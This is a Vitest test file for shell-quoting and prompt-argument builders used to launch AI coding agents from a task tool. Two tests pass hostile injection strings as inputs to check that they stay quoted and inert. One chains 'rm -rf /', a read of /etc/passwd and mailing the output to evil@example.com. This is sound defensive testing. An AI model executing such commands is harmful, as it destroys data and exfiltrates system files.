import { describe, it, expect } from "vitest";
import { shellQuote } from "../../../src/services/hook-adapters/shared.js";
import {
  getAdapterInitialPromptArgs,
  adapterHasInitialPromptArgs,
  commandIsOpencode,
} from "../../../src/services/hook-adapters/index.js";

// Task Master's fix for the claimed-task-never-starts-a-turn bug: a prompt
// is delivered as argv (initialPromptArgs), never through stashSeed's
// SessionStart `additionalContext`, which injects context but never submits
// a turn. See task-claim.ts's own doc comment for the full story.
describe("shellQuote", () => {
  it("wraps a plain string in single quotes", () => {
    expect(shellQuote("hello world")).toBe("'hello world'");
  });

  it("escapes an embedded single quote as close-escape-reopen", () => {
    expect(shellQuote("it's a test")).toBe("'it'\\''s a test'");
  });

  it("leaves shell metacharacters inert inside the quotes", () => {
    // ; & | < > ` $ are all shell-significant outside single quotes, and
    // none of them terminate or escape inside them — the whole point of
    // this quoting form.
    const dangerous = "rm -rf /; echo pwned & cat /etc/passwd | mail evil@example.com < /dev/null";
    expect(shellQuote(dangerous)).toBe(`'${dangerous}'`);
  });

  it("round-trips embedded newlines untouched", () => {
    const withNewline = "line one\nline two";
    expect(shellQuote(withNewline)).toBe(`'${withNewline}'`);
  });

  it("handles multiple embedded single quotes", () => {
    expect(shellQuote("a'b'c")).toBe("'a'\\''b'\\''c'");
  });
});

describe("getAdapterInitialPromptArgs / adapterHasInitialPromptArgs", () => {
  // Hermes review, PR #538 — claude/codex both prepend a `--`
  // end-of-options marker so a task title/prompt starting with `-` (e.g.
  // "- fix X") doesn't get parsed as an unrecognized option, verified live
  // against both CLIs. agy uses `-i=<value>` rather than a space-separated
  // `-i <value>` for the same reason in principle, but see agy.ts's own doc
  // comment for the nuance: Task Master's actual (interactive, no `-p`)
  // spawn shape accepts a leading-hyphen value fine either way — the
  // equals form only matters for a `-p`/print-mode invocation, which Task
  // Master doesn't use today.
  it("returns a `--`-prefixed shell-quoted trailing positional for claude", () => {
    expect(getAdapterInitialPromptArgs("claude", "fix the bug")).toBe("-- 'fix the bug'");
    expect(adapterHasInitialPromptArgs("claude")).toBe(true);
  });

  it("returns a `--`-prefixed shell-quoted trailing positional for codex", () => {
    expect(getAdapterInitialPromptArgs("codex", "fix the bug")).toBe("-- 'fix the bug'");
    expect(adapterHasInitialPromptArgs("codex")).toBe(true);
  });

  it("returns a -i=<value> pair for agy", () => {
    expect(getAdapterInitialPromptArgs("agy", "fix the bug")).toBe("-i='fix the bug'");
    expect(adapterHasInitialPromptArgs("agy")).toBe(true);
  });

  // `--prompt`, not the `--`-prefixed positional the other three use —
  // opencode's own positional argument is `[project]`, a directory path, so
  // an unflagged prompt would be silently misread as one. Verified live
  // against the installed CLI (opencode.ts's own comment) that `--prompt`
  // genuinely submits a turn, not just pre-fills the TUI's input box.
  it("returns a --prompt <value> pair for opencode", () => {
    expect(getAdapterInitialPromptArgs("opencode", "fix the bug")).toBe("--prompt 'fix the bug'");
    expect(adapterHasInitialPromptArgs("opencode")).toBe(true);
  });

  it("returns null for an unmatched/unknown command", () => {
    expect(getAdapterInitialPromptArgs("bash", "fix the bug")).toBeNull();
    expect(adapterHasInitialPromptArgs("bash")).toBe(false);
  });

  it("quotes a prompt containing shell metacharacters safely for every seedable agent", () => {
    const dangerous = "task; rm -rf / && echo pwned | mail x < /dev/null > /tmp/out";
    expect(getAdapterInitialPromptArgs("claude", dangerous)).toBe(`-- '${dangerous}'`);
    expect(getAdapterInitialPromptArgs("codex", dangerous)).toBe(`-- '${dangerous}'`);
    expect(getAdapterInitialPromptArgs("agy", dangerous)).toBe(`-i='${dangerous}'`);
    expect(getAdapterInitialPromptArgs("opencode", dangerous)).toBe(`--prompt '${dangerous}'`);
  });

  it("handles a prompt starting with a hyphen — the exact failure mode this fixes", () => {
    const leadingHyphen = "- fix the leading-hyphen bug";
    expect(getAdapterInitialPromptArgs("claude", leadingHyphen)).toBe(`-- '${leadingHyphen}'`);
    expect(getAdapterInitialPromptArgs("codex", leadingHyphen)).toBe(`-- '${leadingHyphen}'`);
    expect(getAdapterInitialPromptArgs("agy", leadingHyphen)).toBe(`-i='${leadingHyphen}'`);
    // opencode's `--prompt` is a genuine flag (not a bare positional), so a
    // leading hyphen in the prompt text was never ambiguous here the way it
    // is for the other three's positional form — included for parity.
    expect(getAdapterInitialPromptArgs("opencode", leadingHyphen)).toBe(
      `--prompt '${leadingHyphen}'`,
    );
  });

  it("path-qualified commands still match, mirroring matches()'s own anchoring", () => {
    expect(getAdapterInitialPromptArgs("/usr/local/bin/claude", "hi")).toBe("-- 'hi'");
  });
});

// Issue #957 follow-up — `commandIsOpencode` is the gating predicate the
// manual-spawn route and the Task Master worker/review spawns use to decide
// whether resolving the install-wide opencode default makes sense. True only
// for the opencode adapter specifically (a generic "some adapter matches"
// check would also fire for Claude Code/Codex/agy, whose agents will never
// actually read `model`/`small_model` — handing them one renders a misleading
// model badge on a row whose agent ignores the field).
describe("commandIsOpencode", () => {
  it("returns true for opencode commands", () => {
    expect(commandIsOpencode("opencode")).toBe(true);
    expect(commandIsOpencode("opencode --foo")).toBe(true);
    expect(commandIsOpencode("/usr/local/bin/opencode")).toBe(true);
  });

  it("returns false for non-opencode commands, even ones with their own adapter", () => {
    expect(commandIsOpencode("claude")).toBe(false);
    expect(commandIsOpencode("codex")).toBe(false);
    expect(commandIsOpencode("agy")).toBe(false);
  });

  it("returns false for commands with no adapter at all", () => {
    expect(commandIsOpencode("bash")).toBe(false);
    expect(commandIsOpencode("ssh user@host")).toBe(false);
    expect(commandIsOpencode("")).toBe(false);
  });
});
